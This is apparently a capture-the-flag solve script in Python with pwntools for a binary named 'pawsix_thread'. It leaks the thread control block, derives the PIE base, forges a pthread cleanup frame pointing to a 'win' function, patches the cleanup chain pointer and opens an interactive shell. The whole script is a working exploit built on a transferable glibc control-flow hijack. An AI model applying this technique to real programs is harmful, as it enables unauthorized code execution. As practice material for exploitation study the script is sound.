from pwn import *


# --- Key Definitions ---------------------------------------------------------#

context.arch = 'amd64'
exe = ELF('./pawsix_thread')
p = process([exe.path])



# --- OFFSETS -----------------------------------------------------------------#

# TCB
THREAD_FUNC_TCB_OFF          = 0x640
WIN_TCB_OFF                  = 0x648
CLEANUP_BUFFER_TCB_OFF       = 0x2f8
FORGED_CLEANUP_FRAME_TCB_OFF = 0x420

# PIE Base (calculated from ELF symbols)
THREAD_FUNC_PIE_OFF          = exe.symbols['thread_func']
WIN_PIE_OFF                  = exe.symbols['win']


# --- Attack ------------------------------------------------------------------#

# Load TCB to byte array
# Line looks like: My pthread @ 0x7f731f5ff6c0: c0f65f1f737f...
p.recvuntil(b'My pthread @ ')
tcb_base = int(p.recvuntil(b':', drop=True), 16)
hexdump = p.recvline().strip()

tcb = bytearray(bytes.fromhex(hexdump.decode()))

# get PIE base and WIN mem addr
thread_func_leaked = u64(tcb[0x640:0x648])
pie = thread_func_leaked - THREAD_FUNC_PIE_OFF
win = pie + WIN_PIE_OFF

print("\n\n# --- Addresses " + 63*'-' + " #\n")
print(f'TCB Base:        {hex(tcb_base)}')
print(f'thread_func@TCB: {hex(thread_func_leaked)}')
print(f'thread_func OFF: {hex(THREAD_FUNC_PIE_OFF)}')
print(f'PIE Base:        {hex(pie)}')
print(f'WIN offset:      {hex(WIN_PIE_OFF)}')
print(f'WIN address:     {hex(win)}')

# forge the cleanup buffer
FRAME_OFFSET = 0x420
frame_addr = tcb_base + FRAME_OFFSET

tcb[FRAME_OFFSET:FRAME_OFFSET+8] = p64(win)        # __routine
tcb[FRAME_OFFSET+8:FRAME_OFFSET+16] = p64(0)      # __arg
tcb[FRAME_OFFSET+16:FRAME_OFFSET+24] = p64(0)     # __canceltype + padding
tcb[FRAME_OFFSET+24:FRAME_OFFSET+32] = p64(0)     # __prev

# patch cleanup chain pointer at fs:0x2f8
tcb[0x2f8:0x300] = p64(frame_addr)

print("\n\n# --- Forge " + 65*'-' + " #\n")
print(f'Frame address (TCB+0x420): {hex(frame_addr)}')
print(f'Writing to TCB+0x2f8:      {hex(u64(tcb[0x2f8:0x300]))}')
print(f'Writing to TCB+0x420 (__routine): {hex(u64(tcb[0x420:0x428]))}')

# Send it

# Line looks like: Now, give me your pthread:
p.recvuntil(b'Now, give me your pthread:')

# Then send the payload
print("[+] Sending TCB payload...")
p.send(tcb) # send buffer, no sendline


print("\n\n# --- SHELL ACCESS " + 60*'-' + " #\n")

p.interactive()
